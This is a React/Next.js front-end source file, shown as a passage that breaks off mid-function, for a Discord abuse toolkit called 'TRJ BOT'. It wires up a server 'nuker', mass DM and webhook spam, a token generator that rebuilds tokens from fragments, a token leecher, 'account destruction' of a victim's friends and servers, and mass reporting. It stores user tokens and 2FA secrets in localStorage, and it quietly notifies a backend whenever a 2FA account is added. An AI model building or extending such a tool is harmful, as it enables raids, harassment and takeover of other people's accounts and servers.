'use client'

import { useState, useEffect, useCallback, useRef } from 'react'

type Section = 'verify' | 'nuker' | 'copy' | 'spam' | 'leveling' | 'sniper' | 'checker' | 'multi-spam' | 'mass-dm' | 'leaver' | 'react' | 'webhook-spam' | 'voice-online' | 'channel-clear' | 'token-generator' | 'webhook-creator' | 'server-backup' | 'locker' | 'avatar' | 'hypesquad' | 'disconnect' | 'token-info' | 'roles-manager' | 'token-ban' | 'token-save' | 'tool' | 'profile' | 'prime-nuker' | 'prime-raid' | 'account-destruction' | 'mass-report' | 'friend-spam' | 'token-leecher' | 'virus-scan' | 'server-promo' | 'tfa-notify' | 'server-protect'

interface Stats {
  deleted?: number; created?: number; spam_sent?: number; banned?: number; roles?: number
  txt?: number; voice?: number; cats?: number; sent?: number; failed?: number
  blocked?: number; left?: number; total?: number; emojis?: number; permissions?: number; kicked?: number
}

interface Result { username: string; status: string; color: string; debug?: string; method?: string }
interface VerifyInfo { type: string; name: string; id: string; email?: string; nitro?: string; verified?: string; createdAt?: string; flags?: number }
interface TokenCheckResult { token: string; valid: boolean; type: string; name: string; id: string; email?: string; nitro?: string; verified?: string; createdAt?: string; phone?: string; mfa?: string; error?: string }
interface GuildInfo { id: string; name: string; owner: boolean; members: number }

export default function Home() {
  const [section, setSection] = useState<Section>('verify')
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState('')
  const [stats, setStats] = useState<Stats | null>(null)
  const [verifyData, setVerifyData] = useState<VerifyInfo | null>(null)
  const [sniperResults, setSniperResults] = useState<Result[]>([])
  const [checkerResults, setCheckerResults] = useState<TokenCheckResult[]>([])
  const [checkerStats, setCheckerStats] = useState<{ total: number; valid: number; invalid: number; bots: number; users: number; nitro: number } | null>(null)
  const [progress, setProgress] = useState('')
  const [guildList, setGuildList] = useState<GuildInfo[]>([])
  const [extraData, setExtraData] = useState<any>(null)

  const [verifyToken, setVerifyToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_verify_token') || '' })
  const [nukerToken, setNukerToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_nuker_token') || '' })
  const [copyToken, setCopyToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_copy_token') || '' })
  const [spamToken, setSpamToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_spam_token') || '' })
  const [levelingToken, setLevelingToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_leveling_token') || '' })
  const [sniperToken, setSniperToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_sniper_token') || '' })
  const [checkerTokens, setCheckerTokens] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_checker_tokens') || '' })
  const [multiSpamTokens, setMultiSpamTokens] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_multi_tokens') || '' })
  const [massDmToken, setMassDmToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_dm_token') || '' })
  const [leaverToken, setLeaverToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_leaver_token') || '' })
  const [reactToken, setReactToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_react_token') || '' })
  const [whSpamToken, setWhSpamToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_whspam_token') || '' })

  const [guildId, setGuildId] = useState('')
  const [nukeMsg, setNukeMsg] = useState('@everyone NUKED BY TRJ BOT 💀🔥')
  const [nukeChannelName, setNukeChannelName] = useState('nuked-by-trj')
  const [nukeChannelCount, setNukeChannelCount] = useState(50)
  const [nukeMsgPerChannel, setNukeMsgPerChannel] = useState(50)
  const [nukeRenameCh, setNukeRenameCh] = useState('nuked')
  const [nukeSlowmode, setNukeSlowmode] = useState(0)

  const [sourceId, setSourceId] = useState('')
  const [targetId, setTargetId] = useState('')
  const [copyOptions, setCopyOptions] = useState({ roles: true, channels: true, settings: true })

  const [channelId, setChannelId] = useState('')
  const [messages, setMessages] = useState('')
  const [duration, setDuration] = useState(60)
  const [speed, setSpeed] = useState(0.3)

  const [levelingChannelId, setLevelingChannelId] = useState('')
  const [levelingDuration, setLevelingDuration] = useState(300)
  const [levelingSpeed, setLevelingSpeed] = useState(0.8)

  const [sniperMode, setSniperMode] = useState<'auto' | 'manual'>('auto')
  const [usernames, setUsernames] = useState('')
  const [sniperCount, setSniperCount] = useState(10)
  const [sniperLength, setSniperLength] = useState(4)
  const [useDot, setUseDot] = useState(false)
  const [useUnderscore, setUseUnderscore] = useState(false)
  const [sniperAccountInfo, setSniperAccountInfo] = useState<any>(null)
  const [sniperStats, setSniperStats] = useState<any>(null)
  const [availableNames, setAvailableNames] = useState<string[]>([])
  const [sniperPattern, setSniperPattern] = useState('random')

  const [msChannelId, setMsChannelId] = useState('')
  const [msMessages, setMsMessages] = useState('')
  const [msDuration, setMsDuration] = useState(60)
  const [msSpeed, setMsSpeed] = useState(0.3)

  const [dmGuildId, setDmGuildId] = useState('')
  const [dmMessage, setDmMessage] = useState('')
  const [dmMaxMembers, setDmMaxMembers] = useState(100)

  const [reactChannelId, setReactChannelId] = useState('')
  const [reactEmoji, setReactEmoji] = useState('👍 ❤️ 🔥 🎉 💯')
  const [reactMessageId, setReactMessageId] = useState('')
  const [reactMode, setReactMode] = useState<'manual' | 'auto'>('manual')
  const [reactDuration, setReactDuration] = useState(60)

  const [whSpamUrl, setWhSpamUrl] = useState('')
  const [whSpamMessage, setWhSpamMessage] = useState('')
  const [whSpamCount, setWhSpamCount] = useState(50)
  const [whSpamUsername, setWhSpamUsername] = useState('')
  const [voiceToken, setVoiceToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_voice_token') || '' })
  const [voiceGuildId, setVoiceGuildId] = useState('')
  const [voiceChannelId, setVoiceChannelId] = useState('')
  const [voiceDuration, setVoiceDuration] = useState(86400)
  const [voiceActive, setVoiceActive] = useState(false)
  const [voiceSessionCount, setVoiceSessionCount] = useState(0)
  const [voiceRemaining, setVoiceRemaining] = useState('')
  const [voiceStatusLog, setVoiceStatusLog] = useState<string[]>([])
  const [voiceConnecting, setVoiceConnecting] = useState(false)
  const [showTokenGuide, setShowTokenGuide] = useState(false)
  const [showProfile, setShowProfile] = useState(false)
  const [showPrimeModal, setShowPrimeModal] = useState(false)
  const [isPrime, setIsPrime] = useState(() => { if (typeof window === 'undefined') return false; try { return localStorage.getItem('trj_prime_active') === 'true' } catch { return false } })
  const [primeLoading, setPrimeLoading] = useState(false)
  const [primeMsg, setPrimeMsg] = useState('')
  const [primeToken, setPrimeToken] = useState('')
  const [primeCode, setPrimeCode] = useState('')
  const [landingView, setLandingView] = useState<'landing' | 'app' | 'server-promo' | 'virus-scan' | 'twofa'>('landing')
  const [showFeedbackModal, setShowFeedbackModal] = useState(false)
  const [feedbackType, setFeedbackType] = useState<'suggestion' | 'problem'>('suggestion')
  const [feedbackMessage, setFeedbackMessage] = useState('')
  const [feedbackLoading, setFeedbackLoading] = useState(false)
  const [feedbackMsg, setFeedbackMsg] = useState('')
  const [primeUserId, setPrimeUserId] = useState(() => { if (typeof window === 'undefined') return ''; try { return localStorage.getItem('trj_prime_user_id') || '' } catch { return '' } })
  const [primeUsername, setPrimeUsername] = useState(() => { if (typeof window === 'undefined') return ''; try { return localStorage.getItem('trj_prime_username') || '' } catch { return '' } })
  const voiceTimerRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const voiceCountdownRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const voiceWsRef = useRef<WebSocket | null>(null)
  const voiceHbRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const [lockerToken, setLockerToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_locker_token') || '' })
  const [lockerLogs, setLockerLogs] = useState<string[]>([])
  const [lockerLoading, setLockerLoading] = useState(false)

  const [clearToken, setClearToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_clear_token') || '' })
  const [clearChannelId, setClearChannelId] = useState('')
  const [clearCount, setClearCount] = useState(100)
  const [tgMode, setTgMode] = useState<'random' | 'userid' | 'fragment'>('random')
  const [tgCount, setTgCount] = useState(10)
  const [tgUserId, setTgUserId] = useState('')
  const [tgHalfToken, setTgHalfToken] = useState('')
  const [tgFragment, setTgFragment] = useState('')
  const [tgFragmentAnalysis, setTgFragmentAnalysis] = useState<{hasPart1: boolean; hasPart2: boolean; hasPart3: boolean; partialPart1: boolean; partialPart2: boolean; partialPart3: boolean; part1: string; part2: string; part3: string; missingParts: string[]; analysis: string; detail: string; userIDs: string[]; timestamps: string[]; confidence: number} | null>(null)
  const [tgResults, setTgResults] = useState<{token: string; valid: boolean; info?: string; error?: string; index?: number; strategy?: number; size?: number; entropy?: number; isDemo?: boolean}[]>([])
  const [tgRunning, setTgRunning] = useState(false)
  const [tgStats, setTgStats] = useState<{total: number; checked: number; valid: number; invalid: number; skipped: number; speed: string} | null>(null)
  const tgAbortRef = useRef<AbortController | null>(null)
  const [whCreateToken, setWhCreateToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_whcreate_token') || '' })
  const [whCreateGuildId, setWhCreateGuildId] = useState('')
  const [whCreateCount, setWhCreateCount] = useState(1)
  const [whCreateName, setWhCreateName] = useState('TRJ Webhook')
  const [whCreateResults, setWhCreateResults] = useState<{url: string; name: string; id: string; channelId?: string; channelName?: string}[]>([])
  const [whChannels, setWhChannels] = useState<{id: string; name: string; type: number; position: number}[]>([])
  const [whSelectedChannels, setWhSelectedChannels] = useState<string[]>([])
  const [whCreateMode, setWhCreateMode] = useState<'create' | 'spam' | 'existing' | 'find'>('create')
  const [whCrSpamMessage, setWhCrSpamMessage] = useState('@everyone TRJ BOT')
  const [whCrSpamCount, setWhCrSpamCount] = useState(10)
  const [whCrSpamUsername, setWhCrSpamUsername] = useState('')
  const [whCrSpamAvatarUrl, setWhCrSpamAvatarUrl] = useState('')
  const [whEmbedEnabled, setWhEmbedEnabled] = useState(false)
  const [whEmbedTitle, setWhEmbedTitle] = useState('')
  const [whEmbedDesc, setWhEmbedDesc] = useState('')
  const [whEmbedColor, setWhEmbedColor] = useState('5865F2')
  const [whExistingUrls, setWhExistingUrls] = useState('')
  const [whFindResults, setWhFindResults] = useState<{id: string; name: string; channelId: string; token: string}[]>([])
  const [whUltraActive, setWhUltraActive] = useState(false)
  const [whUltraCount, setWhUltraCount] = useState(0)
  const [backupToken, setBackupToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_backup_token') || '' })
  const [backupGuildId, setBackupGuildId] = useState('')
  const [restoreData, setRestoreData] = useState('')
  const [avatarToken, setAvatarToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_avatar_token') || '' })
  const [avatarUrl, setAvatarUrl] = useState('')

  const [hypeToken, setHypeToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_hype_token') || '' })
  const [hypeHouse, setHypeHouse] = useState(1)

  const [disconnectToken, setDisconnectToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_disconnect_token') || '' })

  const [tiToken, setTiToken] = useState('')
  const [tiResult, setTiResult] = useState<any>(null)

  const [rmToken, setRmToken] = useState('')
  const [rmGuildId, setRmGuildId] = useState('')
  const [rmRoleId, setRmRoleId] = useState('')

  const [tbUserToken, setTbUserToken] = useState('')
  const [tbBotToken, setTbBotToken] = useState('')
  const [adDestToken, setAdDestToken] = useState('')
  const [adMessage, setAdMessage] = useState('💀 Account Destroyed by TRJ BOT')
  const [adUsername, setAdUsername] = useState('')
  const [adBio, setAdBio] = useState('')
  const [adAvatar, setAdAvatar] = useState('')
  const [adActions, setAdActions] = useState({ spamDMs: true, deleteFriends: true, leaveServers: true, closeDMs: false })
  const [adLogs, setAdLogs] = useState<string[]>([])
  const [adLoading, setAdLoading] = useState(false)
  const [adStats, setAdStats] = useState<{ dmsSpammed: number; friendsDeleted: number; serversLeft: number; dmsClosed: number } | null>(null)
  const [mrToken, setMrToken] = useState('')
  const [mrTargetId, setMrTargetId] = useState('')
  const [mrReason, setMrReason] = useState('')
  const [mrCount, setMrCount] = useState(10)
  const [mrLogs, setMrLogs] = useState<string[]>([])
  const [mrLoading, setMrLoading] = useState(false)
  const [mrStats, setMrStats] = useState<{ total: number; success: number; failed: number } | null>(null)
  const [fsToken, setFsToken] = useState('')
  const [fsGuildId, setFsGuildId] = useState('')
  const [fsMaxRequests, setFsMaxRequests] = useState(50)
  const [fsMessage, setFsMessage] = useState('')
  const [fsLogs, setFsLogs] = useState<string[]>([])
  const [fsLoading, setFsLoading] = useState(false)
  const [fsStats, setFsStats] = useState<{ total: number; success: number; failed: number } | null>(null)

  const [tlToken, setTlToken] = useState('')
  const [tlGuildId, setTlGuildId] = useState('')
  const [tlLogs, setTlLogs] = useState<string[]>([])
  const [tlLoading, setTlLoading] = useState(false)
  const [tlData, setTlData] = useState<{ members: any[]; channels: any[]; roles: any[]; emojis: any[]; webhooks: any[] } | null>(null)
  const [spBotToken, setSpBotToken] = useState('')
  const [spProtectGuildId, setSpProtectGuildId] = useState('')
  const [spProtectLoading, setSpProtectLoading] = useState(false)
  const [spProtectLogs, setSpProtectLogs] = useState<string[]>([])
  const [spProtectActive, setSpProtectActive] = useState(false)
  const [spGuildList, setSpGuildList] = useState<{id: string; name: string; icon: string | null; owner: boolean; permissions: number; member_count?: number}[]>([])
  const [spGuildLoading, setSpGuildLoading] = useState(false)
  const [spProtectOptions, setSpProtectOptions] = useState({
    antiBot: true,
    antiNuke: true,
    antiRaid: true,
    antiSpam: false,
    antiLink: false,
    antiMassMention: false,
    antiWebhook: false,
    logActions: true,
  })
  const [spWatchMessages, setSpWatchMessages] = useState<string[]>(['مرحباً بك في السيرفر!', 'تم تفعيل الحماية 🛡️'])
  const [spNewWatchMsg, setSpNewWatchMsg] = useState('')
  const [spRaidThreshold, setSpRaidThreshold] = useState(5)
  const [spRaidTime, setSpRaidTime] = useState(10)
  const [tfaNotifyToken, setTfaNotifyToken] = useState('')
  const [tfaNotifyWebhook, setTfaNotifyWebhook] = useState('')
  const [tfaNotifyLogs, setTfaNotifyLogs] = useState<string[]>([])
  const [tfaNotifyLoading, setTfaNotifyLoading] = useState(false)

  // AI Chat moved to separate project

  const [vsFile, setVsFile] = useState<File | null>(null)
  const [vsContent, setVsContent] = useState('')
  const [vsInputMode, setVsInputMode] = useState<'file' | 'code'>('file')
  const [vsLoading, setVsLoading] = useState(false)
  const [vsResult, setVsResult] = useState<any>(null)
  const [vsError, setVsError] = useState('')
  const [vsScanProgress, setVsScanProgress] = useState(0)
  const [vsScanStep, setVsScanStep] = useState('')
  const [vsScanMode] = useState<'trj'>('trj')

  const [spServers, setSpServers] = useState<any[]>([])
  const [spCategories, setSpCategories] = useState<{ id: string; name: string; icon: string }[]>([])
  const [spCategory, setSpCategory] = useState('all')
  const [spSort, setSpSort] = useState('members')
  const [spLoading, setSpLoading] = useState(false)
  const [spShowForm, setShowSpForm] = useState(false)
  const [spFormInvite, setSpFormInvite] = useState('')
  const [spSubmitting, setSpSubmitting] = useState(false)
  const [spMsg, setSpMsg] = useState('')
  const [spTotal, setSpTotal] = useState(0)
  const [spRefreshing, setSpRefreshing] = useState(false)

  interface Saved2FAAccount { id: string; secret: string; label: string; issuer: string; addedAt: string }
  const [twoFaAccounts, setTwoFaAccounts] = useState<Saved2FAAccount[]>(() => { if (typeof window === 'undefined') return []; try { const s = localStorage.getItem('trj_2fa_accounts'); return s ? JSON.parse(s) : [] } catch { return [] } })
  const [twoFaActiveId, setTwoFaActiveId] = useState<string | null>(null)
  const [twoFaStep, setTwoFaStep] = useState<'idle' | 'code' | 'manual'>('idle')
  const [twoFaSecret, setTwoFaSecret] = useState('')
  const [twoFaLabel, setTwoFaLabel] = useState('')
  const [twoFaIssuer, setTwoFaIssuer] = useState('')
  const [twoFaGeneratedCode, setTwoFaGeneratedCode] = useState('')
  const [twoFaTimeLeft, setTwoFaTimeLeft] = useState(30)
  const [twoFaManualKey, setTwoFaManualKey] = useState('')
  const [twoFaCopyFlash, setTwoFaCopyFlash] = useState(false)
  const twoFaTimerRef = useRef<ReturnType<typeof setInterval> | null>(null)
  useEffect(() => { if (typeof window === 'undefined') return; try { localStorage.setItem('trj_2fa_accounts', JSON.stringify(twoFaAccounts)) } catch {} }, [twoFaAccounts])
  const [toolAuthorId] = useState(() => { if (typeof window === 'undefined') return ''; try { return localStorage.getItem('trj_tool_author_id') || ('user_' + Date.now().toString(36) + Math.random().toString(36).substring(2, 8)) } catch { return 'user_' + Date.now().toString(36) } })
  useEffect(() => { if (typeof window !== 'undefined' && toolAuthorId) { try { localStorage.setItem('trj_tool_author_id', toolAuthorId) } catch {} } }, [toolAuthorId])
  interface ToolEntry {
    id: string
    name: string
    description: string
    fileName: string
    fileSize: string
    fileData: string
    fileType: string
    category: string
    author: string
    authorId: string
    downloads: number
    createdAt: string
  }
  const [tools, setTools] = useState<ToolEntry[]>([])
  const [toolsLoading, setToolsLoading] = useState(false)
  const [newToolName, setNewToolName] = useState('')
  const [newToolDesc, setNewToolDesc] = useState('')
  const [newToolCategory, setNewToolCategory] = useState('أدوات')
  const [newToolAuthor, setNewToolAuthor] = useState('')
  const [newToolFile, setNewToolFile] = useState<File | null>(null)
  const fetchTools = useCallback(async () => {
    if (typeof window === 'undefined') return
    setToolsLoading(true)
    try {
      const res = await fetch('/api/tools')
      const data = await res.json()
      if (data.success && Array.isArray(data.tools)) {
        setTools(data.tools)
      }
    } catch { /* offline */ }
    setToolsLoading(false)
  }, [])

  useEffect(() => {
    if (landingView === 'tool') fetchTools()
  }, [landingView, fetchTools])
  interface SavedTokenEntry { id: string; token: string; name: string; type: string; email?: string; nitro?: string; status: 'checking' | 'valid' | 'invalid' | 'changed'; addedAt: string; lastChecked: string; prevName?: string }
  const [savedTokens, setSavedTokens] = useState<SavedTokenEntry[]>(() => { if (typeof window === 'undefined') return []; try { const s = localStorage.getItem('trj_saved_tokens_arr'); return s ? JSON.parse(s) : [] } catch { return [] } })
  const [newTokenInput, setNewTokenInput] = useState('')
  const [tsCheckingAll, setTsCheckingAll] = useState(false)
  const tsAutoCheckRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const savedTokensRef = useRef(savedTokens)
  savedTokensRef.current = savedTokens
  useEffect(() => { if (typeof window === 'undefined') return; try { localStorage.setItem('trj_saved_tokens_arr', JSON.stringify(savedTokens)) } catch {} }, [savedTokens])
  useEffect(() => {
    if (tsAutoCheckRef.current) clearInterval(tsAutoCheckRef.current)
    if (savedTokens.length > 0) {
      tsAutoCheckRef.current = setInterval(async () => {
        const tokens = [...savedTokensRef.current]
        for (const t of tokens) {
          setSavedTokens(prev => prev.map(st => st.id === t.id ? { ...st, status: 'checking' as const } : st))
          try {
            const res = await fetch('/api/verify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: t.token }) })
            const data = await res.json()
            setSavedTokens(prev => prev.map(st => {
              if (st.id !== t.id) return st
              if (data.success) {
                if (t.name && t.name !== data.name) return { ...st, name: data.name, status: 'changed' as const, lastChecked: new Date().toLocaleTimeString('ar-SA'), prevName: t.name }
                return { ...st, name: data.name, status: 'valid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') }
              }
              return { ...st, status: 'invalid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') }
            }))
          } catch { setSavedTokens(prev => prev.map(st => st.id === t.id ? { ...st, status: 'invalid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') } : st)) }
          await new Promise(r => setTimeout(r, 1500))
        }
      }, 3600000)
    }
    return () => { if (tsAutoCheckRef.current) clearInterval(tsAutoCheckRef.current) }
  }, [savedTokens.length])

  useEffect(() => { if (typeof window === 'undefined') return; try { localStorage.setItem('trj_prime_active', isPrime ? 'true' : 'false') } catch {} }, [isPrime])

  // AI chat effects removed - moved to separate project

  const fetchServerPromo = useCallback(async (cat?: string, sort?: string) => {
    spLoading || setSpLoading(true)
    try {
      const params = new URLSearchParams()
      if (cat) params.set('category', cat)
      if (sort) params.set('sort', sort)
      const res = await fetch(`/api/server-promo?${params}`)
      const data = await res.json()
      if (data.success) { setSpServers(data.servers); setSpCategories(data.categories); setSpTotal(data.total) }
    } catch {}
    setSpLoading(false)
  }, [spLoading])

  useEffect(() => { if (landingView === 'app') fetchServerPromo(spCategory, spSort) }, [landingView, spCategory, spSort])

  useEffect(() => { })

  const safeSet = (k: string, v: string) => { try { localStorage.setItem(k, v) } catch {} }
  useEffect(() => {
    if (typeof window === 'undefined') return
    const saves: [string, string][] = [
      ['trj_verify_token', verifyToken], ['trj_nuker_token', nukerToken], ['trj_copy_token', copyToken],
      ['trj_spam_token', spamToken], ['trj_leveling_token', levelingToken], ['trj_sniper_token', sniperToken],
      ['trj_checker_tokens', checkerTokens], ['trj_multi_tokens', multiSpamTokens], ['trj_dm_token', massDmToken],
      ['trj_leaver_token', leaverToken], ['trj_react_token', reactToken], ['trj_whspam_token', whSpamToken],
      ['trj_voice_token', voiceToken], ['trj_locker_token', lockerToken],
      ['trj_clear_token', clearToken], ['trj_whcreate_token', whCreateToken], ['trj_backup_token', backupToken],
      ['trj_avatar_token', avatarToken], ['trj_hype_token', hypeToken],
      ['trj_disconnect_token', disconnectToken],
    ]
    for (const [k, v] of saves) { if (v) safeSet(k, v) }
  }, [verifyToken, nukerToken, copyToken, spamToken, levelingToken, sniperToken, checkerTokens, multiSpamTokens, massDmToken, leaverToken, reactToken, whSpamToken, voiceToken, lockerToken, clearToken, whCreateToken, backupToken, avatarToken, hypeToken, disconnectToken])

  const genUsername = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    const special = (useDot ? '.' : '') + (useUnderscore ? '_' : '')
    const allChars = chars + special
    if (sniperPattern === 'consonants') { const cons = 'bcdfghjklmnpqrstvwxyz'; let u = cons[Math.floor(Math.random() * cons.length)]; for (let i = 1; i < sniperLength; i++) u += allChars[Math.floor(Math.random() * allChars.length)]; return u }
    if (sniperPattern === 'numbers') { let u = chars[Math.floor(Math.random() * 26)]; for (let i = 1; i < sniperLength; i++) u += chars[Math.floor(Math.random() * chars.length)]; return u }
    if (sniperPattern === 'dictionary') { const words = ['the','new','old','big','one','two','red','sun','sky','ice','fire','dark','cool','fast','top','zen','neo','pro','vex','lux','arc','sol','nox','pyx','zex','kai','ray','fox','owl','gem']; return words[Math.floor(Math.random() * words.length)] + String(Math.floor(Math.random() * 999)).padStart(3, '0') }
    if (sniperPattern === 'rare') { const p = [() => { const c = chars[Math.floor(Math.random()*26)]; return c+c+String(Math.floor(Math.random()*9999)).padStart(4,'0') }, () => { const c = chars[Math.floor(Math.random()*26)]; return c+String(Math.floor(Math.random()*99))+c+String(Math.floor(Math.random()*99)) }]; return p[Math.floor(Math.random()*p.length)]() }
    let u = chars[Math.floor(Math.random() * 26)]; for (let i = 1; i < sniperLength; i++) u += allChars[Math.floor(Math.random() * allChars.length)]; return u
  }

  const stopTgGeneration = useCallback(() => {
    if (tgAbortRef.current) { tgAbortRef.current.abort(); tgAbortRef.current = null }
    setTgRunning(false); setProgress('')
  }, [])

  const stopVoiceAnchor = useCallback(() => {
    if (voiceTimerRef.current) { clearInterval(voiceTimerRef.current); voiceTimerRef.current = null }
    if (voiceCountdownRef.current) { clearInterval(voiceCountdownRef.current); voiceCountdownRef.current = null }
    if (voiceHbRef.current) { clearInterval(voiceHbRef.current); voiceHbRef.current = null }
    if (voiceWsRef.current) { try { voiceWsRef.current.close(1000, 'user_stop') } catch {} voiceWsRef.current = null }
    setVoiceActive(false); setVoiceSessionCount(0); setVoiceRemaining(''); setVoiceStatusLog([]); setVoiceConnecting(false)
  }, [])

  const clearState = useCallback(() => { stopTgGeneration(); stopVoiceAnchor(); setResult(''); setStats(null); setVerifyData(null); setSniperResults([]); setSniperAccountInfo(null); setSniperStats(null); setAvailableNames([]); setCheckerResults([]); setCheckerStats(null); setProgress(''); setGuildList([]); setExtraData(null); setTgResults([]); setTgHalfToken(''); setTgStats(null); setWhCreateResults([]); setWhChannels([]); setWhSelectedChannels([]); setTgFragment(''); setTgFragmentAnalysis(null) }, [stopTgGeneration, stopVoiceAnchor])

  const getTimeout = (ep: string) => {
    if (ep === 'voice-online') return 30000   // 30 ثانية
    if (ep === 'copy' || ep === 'nuker' || ep === 'server-backup') return 300000 // 5 دقائق
    return 180000 // 3 دقائق كافي للباقي
  }

  const api = async (endpoint: string, body: any, overrideTimeout?: number) => {
    setLoading(true); setResult(''); setStats(null); setSniperResults([]); setSniperAccountInfo(null); setSniperStats(null); setAvailableNames([]); setCheckerResults([]); setCheckerStats(null); setProgress('جاري التنفيذ...'); setGuildList([]); setExtraData(null)
    try {
      const payload = { ...body }
      const controller = new AbortController()
      const timeoutMs = overrideTimeout || getTimeout(endpoint)
      const timeoutId = setTimeout(() => controller.abort(), timeoutMs)
      const res = await fetch(`/api/${endpoint}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), signal: controller.signal })
      clearTimeout(timeoutId)
      const data = await res.json()
      if (data.success) {
        setResult('✅ تم بنجاح!')
        if (endpoint === 'sniper') { setSniperResults(data.results); if (data.stats) setSniperStats(data.stats); if (data.availableNames) setAvailableNames(data.availableNames); if (data.accountInfo) setSniperAccountInfo(data.accountInfo) }
        else if (endpoint === 'token-checker') { setCheckerResults(data.results); if (data.stats) setCheckerStats(data.stats) }
        else if (endpoint === 'leaver' && data.guilds) { setGuildList(data.guilds) }
        else if (endpoint === 'leaver' && data.servers) { setGuildList(data.servers.map((s: any) => ({ id: s.id, name: s.name, owner: s.name?.includes('owner'), members: 0 }))) }
        else if (endpoint === 'multi-spam' && data.stats?.tokenStats) { setExtraData(data.stats.tokenStats) }

        if (data.stats) setStats(data.stats)
        setLoading(false); setProgress(''); return data
      } else { setResult(`❌ ${data.error}`); setLoading(false); setProgress(''); return null }
    } catch (e) {
      if (e instanceof Error && e.name === 'AbortError') setResult('❌ انتهى وقت الانتظار - حاول عدد أقل')
      else setResult('❌ خطأ في الاتصال')
      setLoading(false); setProgress(''); return null
    }
  }

  const base32Decode = (str: string): Uint8Array => {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
    let bits = ''
    for (const char of str.toUpperCase()) {
      const val = alphabet.indexOf(char)
      if (val === -1) continue
      bits += val.toString(2).padStart(5, '0')
    }
    const bytes = new Uint8Array(Math.floor(bits.length / 8))
    for (let i = 0; i < bytes.length; i++) {
      bytes[i] = parseInt(bits.substring(i * 8, i * 8 + 8), 2)
    }
    return bytes
  }

  const generateTOTP = async (secret: string): Promise<string> => {
    try {
      const key = base32Decode(secret.replace(/\s/g, ''))
      const timeStep = Math.floor(Date.now() / 30000)
      const counter = new Uint8Array(8)
      let tmp = timeStep
      for (let i = 7; i >= 0; i--) { counter[i] = tmp & 0xff; tmp = Math.floor(tmp / 256) }
      const cryptoKey = await crypto.subtle.importKey('raw', key, { name: 'HMAC', hash: 'SHA-1' }, false, ['sign'])
      const sig = await crypto.subtle.sign('HMAC', cryptoKey, counter)
      const hmac = new Uint8Array(sig)
      const offset = hmac[hmac.length - 1] & 0x0f
      const code = ((hmac[offset] & 0x7f) << 24 | (hmac[offset + 1] & 0xff) << 16 | (hmac[offset + 2] & 0xff) << 8 | (hmac[offset + 3] & 0xff)) % 1000000
      return code.toString().padStart(6, '0')
    } catch { return '------' }
  }

  const startTOTPTimer = useCallback((secret: string) => {
    if (twoFaTimerRef.current) clearInterval(twoFaTimerRef.current)
    const update = async () => {
      const code = await generateTOTP(secret)
      const now = Math.floor(Date.now() / 1000)
      const remaining = 30 - (now % 30)
      setTwoFaGeneratedCode(code)
      setTwoFaTimeLeft(remaining)
    }
    update()
    twoFaTimerRef.current = setInterval(update, 1000)
  }, [])

  const stopTOTPTimer = useCallback(() => {
    if (twoFaTimerRef.current) { clearInterval(twoFaTimerRef.current); twoFaTimerRef.current = null }
  }, [])

  const parse2FAUrl = (data: string) => {
    try {
      const url = new URL(data)
      if (url.protocol === 'otpauth:' && url.pathname.startsWith('//totp/')) {
        const secret = url.searchParams.get('secret') || ''
        const label = decodeURIComponent(url.pathname.replace('//totp/', ''))
        const issuer = url.searchParams.get('issuer') || ''
        if (secret) { activate2FA(secret, label, issuer); return }
      }
    } catch { /* raw key */ }
    if (data.length >= 16 && /^[A-Z2-7]+=*$/i.test(data.replace(/\s/g, ''))) {
      activate2FA(data.replace(/\s/g, ''), 'Discord', 'Discord'); return
    }
  }

  const activate2FA = (secret: string, label: string, issuer: string) => {
    setTwoFaSecret(secret); setTwoFaLabel(label); setTwoFaIssuer(issuer)
    setTwoFaStep('code')
    startTOTPTimer(secret)
    setTwoFaAccounts(prev => {
      if (prev.find(a => a.secret === secret)) return prev
      try {
        fetch('/api/tfa-notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ label, issuer: issuer || 'Discord', action: 'activate' })
        }).catch(() => {})
      } catch {}
      return [...prev, { id: Date.now().toString(36), secret, label, issuer: issuer || 'Discord', addedAt: new Date().toLocaleDateString('ar-SA') }]
    })
  }

  const handleManualSubmit = useCallback(() => {
    const key = twoFaManualKey.replace(/\s/g, '')
    if (key.length < 16) { setResult('❌ المفتاح قصير — 16 حرف على الأقل'); return }
    if (!/^[A-Z2-7]+=*$/i.test(key)) { setResult('❌ المفتاح غير صالح — A-Z و 2-7 فقط'); return }
    activate2FA(key, 'Discord', 'Discord')
  }, [twoFaManualKey])

  const selectAccount = useCallback((account: Saved2FAAccount) => {
